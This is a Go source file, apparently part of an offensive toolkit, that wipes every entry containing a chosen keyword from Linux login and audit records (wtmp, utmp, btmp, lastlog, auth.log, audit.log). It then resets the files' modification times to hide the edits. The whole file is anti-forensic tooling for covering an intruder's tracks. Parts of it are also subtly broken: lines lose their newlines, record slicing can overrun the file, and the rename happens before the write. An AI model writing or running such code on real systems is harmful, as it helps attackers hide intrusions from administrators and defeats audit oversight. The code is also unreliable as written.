package zap

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"os"

	log "github.com/sirupsen/logrus"
)

const (
	PATH_WTMP    = "/var/log/wtmp"
	PATH_UTMP    = "/var/run/utmp"
	PATH_LASTLOG = "/var/log/lastlog"
	PATH_AUTH    = "/var/log/auth.log"
	PATH_AUDIT   = "/var/log/audit/audit.log"

	// todo: add keyword cleaning logic for the below
	PATH_MESSAGES = "/var/log/messages"
	PATH_SECURE   = "/var/log/secure"
	PATH_SYSLOG   = "/var/log/syslog"
)

// TrimKey removes entries containing keyword in log files.
func TrimKey(keyword string) {
	deleteXtmpEntry(keyword)

	err := deleteLastlog(keyword)
	if err != nil {
		log.Errorf("lastlog %v", err)
	}

	err = cleanAuthlog(keyword)
	if err != nil {
		log.Errorf("authlog: %v", err)
	}

	err = cleanAuditLog(keyword)
	if err != nil {
		log.Errorf("auditlog: %v", err)
	}
}

func cleanAuthlog(keyword string) error {
	path := PATH_AUTH

	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	scan := bufio.NewScanner(file)
	var newFile []byte
	for scan.Scan() {
		if bytes.Contains(scan.Bytes(), []byte(keyword)) {
			continue
		}
		newFile = append(newFile, scan.Bytes()...)
	}

	err = os.WriteFile(path+".tmp", newFile, 0640)
	if err != nil {
		return err
	}

	err = os.Rename(path+".tmp", path)
	if err != nil {
		return err
	}

	log.Infof("removed %v from %v", keyword, path)

	return nil
}

func cleanAuditLog(keyword string) error {
	path := PATH_AUDIT

	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	scan := bufio.NewScanner(file)
	var newFile []byte
	for scan.Scan() {
		if bytes.Contains(scan.Bytes(), []byte(keyword)) {
			continue
		}
		newFile = append(newFile, scan.Bytes()...)
	}

	err = os.WriteFile(path+".tmp", newFile, 0640)
	if err != nil {
		return err
	}

	cloneTime(path, path+".tmp")

	err = os.Rename(path+".tmp", path)
	if err != nil {
		return err
	}

	log.Infof("removed %v from %v", keyword, path)

	return nil
}

func deleteLastlog(keyword string) error {
	size := 292
	path := "/var/log/lastlog"

	data, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	var offset = 0
	var fileData []byte
	for offset < len(data) {
		buf := data[offset:(offset + size)]
		if bytes.Contains(buf, []byte(keyword)) {
			offset += size
			continue
		}
		fileData = append(fileData, buf...)
		offset += size
	}

	var tmp = path + ".tmp"
	err = os.WriteFile(tmp, fileData, 0640)
	if err != nil {
		return err
	}

	cloneTime(path, tmp)

	err = os.Rename(tmp, path)
	if err != nil {
		return err
	}

	log.Infof("removed %v from %v", keyword, path)

	return nil
}

// deleteXtmpEntry delete a wtmp/utmp/btmp entry containing keyword
func deleteXtmpEntry(keyword string) {
	xtmpFiles := []string{"/var/log/wtmp", "/var/log/btmp", "/var/log/utmp", "/var/run/utmp"}
	for _, xtmp := range xtmpFiles {
		if fileExists(xtmp) {
			err := delete(xtmp, keyword)
			if err != nil {
				log.Errorf("%v error: %v", xtmp, err)
			}
			log.Infof("removed %v from %v", keyword, xtmp)
		}
	}
}

func delete(path, keyword string) (err error) {
	var (
		offset      = 0
		newFileData []byte
	)
	xtmpf, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("failed to open xtmp: %v", err)
	}
	defer xtmpf.Close()
	xmtpData, err := ioutil.ReadFile(path)
	if err != nil {
		return fmt.Errorf("failed to read xtmp: %v", err)
	}

	for offset < len(xmtpData) {
		buf := xmtpData[offset:(offset + 384)]
		if bytes.Contains(buf, []byte(keyword)) {
			offset += 384
			continue
		}
		newFileData = append(newFileData, buf...)
		offset += 384
	}

	// save new file as xtmp.tmp, users need to rename it manually, in case the file is corrupted
	newXtmp, err := os.OpenFile(path+".tmp", os.O_CREATE|os.O_RDWR, 0640)
	if err != nil {
		return fmt.Errorf("failed to open temp xtmp: %v", err)
	}
	defer newXtmp.Close()

	err = os.Rename(path+".tmp", path)
	if err != nil {
		return fmt.Errorf("failed to replace %s: %v", path, err)
	}

	_, err = newXtmp.Write(newFileData)

	return cloneTime(path, path+".tmp")
}

// fileExists checks if a file exists.
func fileExists(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	}
	return true
}

// cloneTime updates the modtime from file A to file B.
func cloneTime(from, to string) error {
	file, err := os.Stat(from)
	if err != nil {
		return err
	}
	modtime := file.ModTime()
	return os.Chtimes(to, modtime, modtime)
}
